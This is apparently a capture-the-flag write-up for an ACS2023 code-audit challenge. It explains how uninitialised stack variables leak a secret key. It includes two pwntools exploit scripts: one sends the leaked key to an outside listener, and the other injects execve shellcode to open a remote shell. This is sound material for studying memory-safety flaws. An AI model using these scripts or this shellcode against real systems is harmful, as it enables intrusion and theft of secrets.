---
title : "Key In Haystack [Code Audit]"
categories: ACS2023
---

Absence of stack initialization and subtle vulnerability to leak secrets read onto the stack.

# Challenge Description
(Lost it :P)

(Challenge connects over `nc` in LAN)

[KeyInHaystack.c]({{ site.url }}/files/acs2023/keyinhaystack/KeyInHaystack.c){: .btn .btn--info}

# Finding the Vulnerability

The program allows users to interact using 4 menu commands:

`get_command()`:
1. `INSERT`: write bytes into a memory section called `admin_command_page` with `rwx` permissions.
2. `ADMIN`: request user input and compare with contents of file `key`, execute code at `admin_command_page` on success.
3. `GAMBLE`: reads 4 bytes from `/dev/urandom`, execute code at `admin_command_page` if the value is exactly 777.
4. `LOG`: allow user to specify an IPV4 address and port, and connects to it, `log_write` throughout the code writes to that socket.

The goal is to insert shellcode into the allocated memory page, and execute it either through `GAMBLE` or `ADMIN`. Since `GAMBLE` depends on `urandom` which is considered secure, this is not a reasonable direction to go towards. We will be looking at leaking the key to obtain admin rights.

We will first look at the function that checks our key:

```c
int get_command(){
	int ret;
	int key;
	int fd;
	
	sleep(1);

	ret = get_command_internal();
	if(ret==ADMIN){
		fd = open("key", O_RDONLY);
		read(fd, &key, 4); // this writes the key into the local variable on the stack
		close(fd);
		ret = key_check((char *)&key, 4);
		if(ret==1){
			return ADMIN;
		}else{
			log_write("key is wrong\n");
			return 0;
		}
	}
	return ret;
}
```

User input is obtained inside `key_check`. Upon calling the `ADMIN` command, the `key` variable will be populated with the secret value. Many functions do not initialize variables with values. This brings us our first key observation:

> If a function reuses the stack frame and doesn't initialize the local variables, then the local variables might hold the value of `key` temporarily.

The thing is that almost all the variables are initalized upon first usage (e.g. via `read_until`). Even if not, how do we get the values anyway? The second key observation is here:

a utility function called `read_until(buf, size)` which supposedly reads from `stdin` into `buf` until `size` bytes. This is interesting because of the `-1` erroneous termination (used later).

```c
int insert(){
	unsigned int size_max;
	unsigned int size;
	int ret;
		
	size_max = 0x1000;
	log_write("Insert Code\n");

	ret = read_until((char *)&size, 4);
	if(size>=size_max){
		log_write("size is too big:%d, must be less than %d\n", size, size_max);
		return -1;
	}
	if(ret == -1){
		return -1;
	}
	ret = insert_internal(size);

    	return ret;
}
```

Notice that if `read_until((char *)&size, 4);` terminates without writing anything to `size`, then `size` has value exactly that of `key`, assuming we run `INSERT` (triggers `insert` as handler) after `ADMIN`.

This part of the code in particular, doesn't handle the erroneous `ret == -1` immediately, which gives us a chance to leak the `key` value through `log_write` since `key` should be larger than `0x1000` as long as the MSB 2 bytes are not both 0.

Looking at `read_until`, the only way to terminate is to have `ret <= 0` before `size <= 0` is met and satisfied. We can do this by closing the `stdin` buffer and let `read` fail to read anything (`ret == 0` but maybe `size > 0`).

```c
int read_until(char *buf, unsigned int size){
	int ret;	
	while(1){
		ret = read(0, buf, size);
		if(ret<=0){
			return -1;
		}
		size -= ret;
		if(size <= 0)
			break;
	}
	return 0;
}
```

So we just need to make use of the `LOG` command to send the logs to our server and we can get admin access!

> Fun fact: notice that inside `log_connect` (handler for `LOG`)
> ```c
> int log_connect(){
>     int ret;
>     int port;
>     unsigned int size;
>     char ip_str[0x100];
>     ...
> ```
> the `ip_str` has an unnecessarily large size of `0x100` to make sure we don't overwrite the `key` value :) small detail but cool~

# Solution

With our 2 key observations, we can lay out the exploit steps (in 2 parts):

First part
1. Run `nc -l 8000` on our own server
2. Start the program and call `LOG`, then pass in our server IP and port 8000
3. Run `ADMIN` and input any key (should be wrong unless super lucky)
4. Run `INSERT` and immediately close input channel (this is easy to do with pwntools)
5. Get leaked key value from our server's (listener) output

In particular, these is the output I had:
```
Listening on 0.0.0.0 8000
CONNECT
key is wrong
Insert Code
size is too big:1315057728, must be less than 4096
process end
```

6. Start a new connection to the program, and call `INSERT` and pass in shellcode to open shell
7. Call `ADMIN`, then pass in the key we obtained
8. We should get a shell, and we can `cat` the flag :)

# Final Script
`get_key.py`:
```python
from pwn import *
import time

DEBUG = True

def open_conn():
    if DEBUG:
        return process("./keyinhaystack")
    else:
        return remote("192.168.0.45", 5555)

conn = open_conn()

def hook_log():
    ip = b"127.0.0.1" if DEBUG else b"165.22.244.105"
    send_command("LOG")
    recv_line()
    send_line(len(ip).to_bytes(4, 'little'))
    send_line(ip)
    recv_line()
    send_line((8000).to_bytes(4, 'little'))

def send_command(command):
    time.sleep(1)
    send_line(command, pad=10)

def send_line(msg, pad=None):
    if type(msg) == str:
        msg = msg.encode()
    if pad is not None:
        msg = msg.ljust(pad, b'\0')
    print("<<<", msg)
    conn.send(msg)

def recv_line():
    print(">>>", conn.recvline())

# get key
hook_log()

send_command("ADMIN")
send_line("BBBB") # wrong key

send_command("INSERT")
time.sleep(1)

conn.shutdown("send") # close stdin buffer on server
time.sleep(1)
conn.close()
```

`get_shell.py`:
```python
from pwn import *
import time

context.update(arch='amd64', os='linux')

DEBUG = True

def open_conn():
    if DEBUG:
        return process("./keyinhaystack")
    else:
        return remote("192.168.0.45", 5555)

conn = open_conn()

def hook_log():
    ip = b"127.0.0.1" if DEBUG else b"165.22.244.105"
    send_command("LOG")
    recv_line()
    send_line(len(ip).to_bytes(4, 'little'))
    send_line(ip)
    recv_line()
    send_line((8000).to_bytes(4, 'little'))

def send_command(command):
    time.sleep(1)
    send_line(command, pad=10)

def send_line(msg, pad=None):
    if type(msg) == str:
        msg = msg.encode()
    if pad is not None:
        msg = msg.ljust(pad, b'\0')
    print("<<<", msg)
    conn.send(msg)

def recv_line():
    print(">>>", conn.recvline())

# shellcode = asm(shellcraft.amd64.linux.sh())
shellcode = b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'

key = (1499022667).to_bytes(4, 'little')

hook_log()

send_command("INSERT")
send_line(len(shellcode).to_bytes(4, 'little'))
send_line(shellcode)

send_command("ADMIN")
send_line(key) # correct key

time.sleep(1)

conn.interactive()
```
